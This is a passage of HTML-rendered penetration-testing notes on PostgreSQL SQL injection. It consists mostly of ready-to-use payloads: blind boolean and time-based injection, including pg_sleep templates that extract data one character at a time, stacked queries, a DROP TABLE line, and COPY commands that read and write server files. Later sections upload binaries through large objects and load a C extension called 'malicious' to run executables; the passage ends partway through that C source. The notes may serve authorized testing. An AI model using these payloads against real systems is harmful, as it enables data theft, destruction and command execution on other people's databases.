+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">SOMETABLE</span><span class="p">(</span><span class="n">columnbus123</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="err">$$</span><span class="n">test$$</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>Drop/delete table
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="k">DROP</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">SOMETABLE</span><span class="p">;</span>
+</span></code></pre></div></li>
+<li>Test Boolean
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="mi">1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">END</span><span class="p">;</span>
+</span></code></pre></div></li>
+<li>Stacked queries
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="mi">1</span><span class="p">;</span><span class="k">SELECT</span><span class="w"> </span><span class="p">(</span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">END</span><span class="p">)</span><span class="c1">--</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="p">;</span><span class="k">SELECT</span><span class="o">+</span><span class="k">case</span><span class="o">+</span><span class="k">when</span><span class="o">+</span><span class="p">(</span><span class="k">SELECT</span><span class="o">+</span><span class="n">current_setting</span><span class="p">(</span><span class="err">$$</span><span class="n">is_superuser$$</span><span class="p">))</span><span class="o">=</span><span class="err">$$</span><span class="k">on</span><span class="err">$$</span><span class="o">+</span><span class="k">then</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="k">end</span><span class="p">;</span><span class="c1">--+ # Time based example</span>
+</span></code></pre></div></li>
+</ul>
+<h3 id="specific-usualallowedworking-subqueries-for-specific-locations-within-the-query">Specific usual/allowed/working subqueries for specific locations within the query</h3>
+<ul>
+<li>where
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">usedid</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">END</span>
+</span></code></pre></div></li>
+<li>When stacked queries are available but still blind
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">userid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">current_setting</span><span class="p">(</span><span class="err">$$</span><span class="n">is_superuser$$</span><span class="p">))</span><span class="o">=</span><span class="err">$$</span><span class="k">on</span><span class="err">$$</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">end</span><span class="p">;</span><span class="c1">--</span>
+</span></code></pre></div></li>
+<li>order by
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="k">COUNT</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="k">COUNT</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">staff</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">SIMILAR</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;M%&#39;</span><span class="p">))</span><span class="o">&lt;&gt;</span><span class="mi">0</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">END</span><span class="p">)))</span><span class="o">&lt;&gt;</span><span class="mi">0</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="k">END</span><span class="p">);</span><span class="w"> </span><span class="c1">-- - # From link at the start</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="k">COUNT</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="k">LENGTH</span><span class="p">(([</span><span class="n">SQLI</span><span class="p">])::</span><span class="nb">text</span><span class="p">)</span><span class="o">=</span><span class="n">NUMNUMNUM</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="err">{</span><span class="n">sqli_sleep_time</span><span class="err">}</span><span class="p">)</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">END</span><span class="p">)))</span><span class="o">&lt;&gt;</span><span class="mi">0</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="k">END</span><span class="p">)</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">Actually</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">getLength</span><span class="w"> </span><span class="p">(</span><span class="k">Replace</span><span class="w"> </span><span class="p">[</span><span class="n">SQLI</span><span class="p">]</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">couse</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="k">variable</span><span class="w"> </span><span class="n">sqli_sleep_time</span><span class="p">.</span><span class="w"> </span><span class="n">Also</span><span class="w"> </span><span class="n">NUMNUMNUM</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">replaced</span><span class="p">)</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="k">COUNT</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(([</span><span class="n">SQLI</span><span class="p">])::</span><span class="nb">text</span><span class="p">,</span><span class="n">POSPOSPOS</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="n">CHR</span><span class="p">(</span><span class="n">NUMNUMNUM</span><span class="p">)</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="err">{</span><span class="n">sqli_sleep_time</span><span class="err">}</span><span class="p">)</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">END</span><span class="p">)))</span><span class="o">&lt;&gt;</span><span class="mi">0</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="k">END</span><span class="p">)</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">Actually</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">line</span><span class="p">.</span><span class="w"> </span><span class="p">(</span><span class="k">Replace</span><span class="w"> </span><span class="p">[</span><span class="n">SQLI</span><span class="p">]</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">couse</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="k">variable</span><span class="w"> </span><span class="n">sqli_sleep_time</span><span class="p">.</span><span class="w"> </span><span class="n">Also</span><span class="w"> </span><span class="n">NUMNUMNUM</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">POSPOSPOS</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">replaced</span><span class="p">)</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">note</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">)</span><span class="o">+</span><span class="k">THEN</span><span class="o">+</span><span class="n">note</span><span class="o">+</span><span class="k">ELSE</span><span class="o">+</span><span class="n">id</span><span class="p">::</span><span class="nb">text</span><span class="o">+</span><span class="k">END</span><span class="p">)</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">Turn</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nb">boolean</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">making</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">output</span><span class="w"> </span><span class="n">different</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">way</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">sorted</span><span class="p">.</span><span class="w"> </span><span class="k">From</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="p">.</span><span class="n">nz</span><span class="w"> </span><span class="n">link</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">start</span>
+</span></code></pre></div></li>
+</ul>
+<h3 id="write-to-file-system">Write to file system</h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="n">TEMP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">USERS</span><span class="p">(</span><span class="n">userdesccolumn</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">USERS</span><span class="p">(</span><span class="n">userdesccolumn</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="err">$$</span><span class="n">test$$</span><span class="p">);</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="k">COPY</span><span class="w"> </span><span class="n">USERS</span><span class="p">(</span><span class="n">userdesccolumn</span><span class="p">)</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="err">$$</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">writtenfile</span><span class="p">.</span><span class="n">txt$$</span><span class="p">;</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="k">COPY</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;USERS&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="s1">&#39;C:\Users\Public\writtenfile.txt&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<h3 id="reading-content-from-file-system">Reading content from file system</h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="k">COPY</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table_name</span><span class="o">&gt;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">&lt;</span><span class="n">file_name</span><span class="o">&gt;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">Template</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="k">CREATE</span><span class="w"> </span><span class="n">temp</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">tempTable</span><span class="w"> </span><span class="p">(</span><span class="n">content</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="k">COPY</span><span class="w"> </span><span class="n">tempTable</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="err">$$</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">secret</span><span class="p">.</span><span class="n">txt$$</span><span class="p">;</span>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="p">;</span><span class="k">create</span><span class="o">+</span><span class="n">temp</span><span class="o">+</span><span class="k">table</span><span class="o">+</span><span class="n">tempTable</span><span class="o">+</span><span class="p">(</span><span class="n">content</span><span class="o">+</span><span class="nb">text</span><span class="p">);</span><span class="k">copy</span><span class="o">+</span><span class="n">tempTable</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="err">$$</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">secret</span><span class="p">.</span><span class="n">txt$$</span><span class="p">;</span><span class="k">select</span><span class="o">+</span><span class="k">case</span><span class="o">+</span><span class="k">when</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">content</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">tempTable</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">104</span><span class="p">)</span><span class="o">+</span><span class="k">then</span><span class="o">+</span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">+</span><span class="k">end</span><span class="p">;</span><span class="c1">--+ # Boolean Time-Based</span>
+</span></code></pre></div>
+<h3 id="executing-commands-via-postgresql-extensions">Executing commands via PostgreSQL Extensions</h3>
+<ul>
+<li>Loading extensions
+  <div class="language-sql highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="k">REPLACE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">test</span><span class="p">(</span><span class="nb">text</span><span class="p">)</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s1">&#39;FILENAME&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="k">LANGUAGE</span><span class="w"> </span><span class="s1">&#39;C&#39;</span><span class="w"> </span><span class="k">STRICT</span><span class="p">;</span><span class="w"> </span><span class="c1">-- Must define an appropriate Postgres structure (magic block)</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="k">create</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="k">replace</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">test</span><span class="p">(</span><span class="nb">text</span><span class="p">,</span><span class="w"> </span><span class="nb">integer</span><span class="p">)</span><span class="w"> </span><span class="k">returns</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">$$</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">malicious</span><span class="p">.</span><span class="n">dll$$</span><span class="p">,</span><span class="err">$$</span><span class="n">test$$</span><span class="w"> </span><span class="k">language</span><span class="w"> </span><span class="k">C</span><span class="w"> </span><span class="k">strict</span><span class="p">;</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">test</span><span class="p">(</span><span class="err">$$</span><span class="n">calc</span><span class="p">.</span><span class="n">exe$$</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>How to build a custom extension? see far below</li>
+</ul>
+<h3 id="large-objects-uploading-a-binary">Large Objects (Uploading a Binary)</h3>
+<ul>
+<li>This (large objects) only works on the dba (admin) level</li>
+<li>Import
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="k">select</span><span class="w"> </span><span class="n">lo_import</span><span class="p">(</span><span class="s1">&#39;C:\\Windows\\win.ini&#39;</span><span class="p">);</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="k">select</span><span class="w"> </span><span class="n">lo_import</span><span class="p">(</span><span class="s1">&#39;C:\\Windows\\win.ini&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1337</span><span class="p">);</span><span class="w"> </span><span class="c1">-- Import defining loid</span>
+</span></code></pre></div></li>
+<li>List
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="err">\</span><span class="n">lo_list</span>
+</span></code></pre></div></li>
+<li>Viewing Content
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="k">select</span><span class="w"> </span><span class="n">loid</span><span class="p">,</span><span class="w"> </span><span class="n">pageno</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span><span class="p">;</span><span class="w"> </span><span class="c1">-- per page, max 2kB blocks</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="k">select</span><span class="w"> </span><span class="n">loid</span><span class="p">,</span><span class="w"> </span><span class="n">pageno</span><span class="p">,</span><span class="w"> </span><span class="n">encode</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;escape&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span><span class="p">;</span><span class="w"> </span><span class="c1">-- per page, max 2kB blocks</span>
+</span></code></pre></div></li>
+<li>Update entry (adding file remotely)
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="k">update</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="k">data</span><span class="o">=</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;77303074&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">loid</span><span class="o">=</span><span class="mi">1337</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">pageno</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">--decoded data is &#39;woot&#39;</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">PG_LARGEOBJECT</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="k">data</span><span class="o">=</span><span class="n">decode</span><span class="p">(</span><span class="err">$${</span><span class="n">udf_chunk</span><span class="err">}$$</span><span class="p">,</span><span class="err">$$</span><span class="n">hex$$</span><span class="p">)</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">loid</span><span class="o">=</span><span class="err">{</span><span class="n">loid</span><span class="err">}</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">pageno</span><span class="o">=</span><span class="err">{</span><span class="n">i</span><span class="err">}</span><span class="p">;</span><span class="c1">--</span>
+</span></code></pre></div></li>
+<li>Insert new data to new pages (comes after update to pageno=0)
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">PG_LARGEOBJECT</span><span class="w"> </span><span class="p">(</span><span class="n">loid</span><span class="p">,</span><span class="w"> </span><span class="n">pageno</span><span class="p">,</span><span class="w"> </span><span class="k">data</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="err">{</span><span class="n">loid</span><span class="err">}</span><span class="p">,</span><span class="err">{</span><span class="n">i</span><span class="err">}</span><span class="p">,</span><span class="n">decode</span><span class="p">(</span><span class="err">$${</span><span class="n">udf_chunk</span><span class="err">}$$</span><span class="p">,</span><span class="err">$$</span><span class="n">hex$$</span><span class="p">));</span><span class="c1">--</span>
+</span></code></pre></div></li>
+<li>Export
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="k">select</span><span class="w"> </span><span class="n">lo_export</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;C:\\new_win.ini&#39;</span><span class="p">);</span>
+</span></code></pre></div></li>
+<li>To trigger UDF, see "Executing commands via PostgreSQL Extensions" above[^3]</li>
+<li>
+<p>Cleanup/Delete/Unlink
+    <div class="language-sql highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">lo_unlink</span><span class="w"> </span><span class="mi">1337</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>PostgresQL extensions</p>
+<ul>
+<li>Extensions to execute commands (For Windows)
+    <div class="language-c highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;postgres.h&quot;</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;fmgr.h&quot;</span>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;utils/geo_decls.h&quot;</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;utils/builtins.h&quot;</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="cp">#ifdef PG_MODULE_MAGIC</span>
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="n">PG_MODULE_MAGIC</span><span class="p">;</span>
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="cp">#endif</span>
+</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>
+</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="cm">/* Add a prototype marked PGDLLEXPORT */</span>
+</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="n">PGDLLEXPORT</span><span class="w"> </span><span class="n">Datum</span><span class="w"> </span><span class="n">malicious</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">);</span>
+</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a><span class="n">PG_FUNCTION_INFO_V1</span><span class="p">(</span><span class="n">malicious</span><span class="p">);</span>
+</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a>
+</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a><span class="cm">/* this function launches the executable passed in as the first parameter</span>
+</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="cm">in a FOR loop bound by the second parameter that is also passed*/</span>
+</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a><span class="n">Datum</span>
+</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a><span class="nf">malicious</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">)</span>
+</span><span id="__span-52-20"><a id="__codelineno-52-20" name="__codelineno-52-20" href="#__codelineno-52-20"></a><span class="p">{</span>
+</span><span id="__span-52-21"><a id="__codelineno-52-21" name="__codelineno-52-21" href="#__codelineno-52-21"></a><span class="w">    </span><span class="cm">/* convert text pointer to C string */</span>
+</span><span id="__span-52-22"><a id="__codelineno-52-22" name="__codelineno-52-22" href="#__codelineno-52-22"></a><span class="cp">#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))</span>
+</span><span id="__span-52-23"><a id="__codelineno-52-23" name="__codelineno-52-23" href="#__codelineno-52-23"></a>
+</span><span id="__span-52-24"><a id="__codelineno-52-24" name="__codelineno-52-24" href="#__codelineno-52-24"></a><span class="w">    </span><span class="cm">/* retrieve the second argument that is passed to the function (an integer)</span>
+</span><span id="__span-52-25"><a id="__codelineno-52-25" name="__codelineno-52-25" href="#__codelineno-52-25"></a><span class="cm">    that will serve as our counter limit*/</span>
+</span><span id="__span-52-26"><a id="__codelineno-52-26" name="__codelineno-52-26" href="#__codelineno-52-26"></a>
+</span><span id="__span-52-27"><a id="__codelineno-52-27" name="__codelineno-52-27" href="#__codelineno-52-27"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">instances</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PG_GETARG_INT32</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
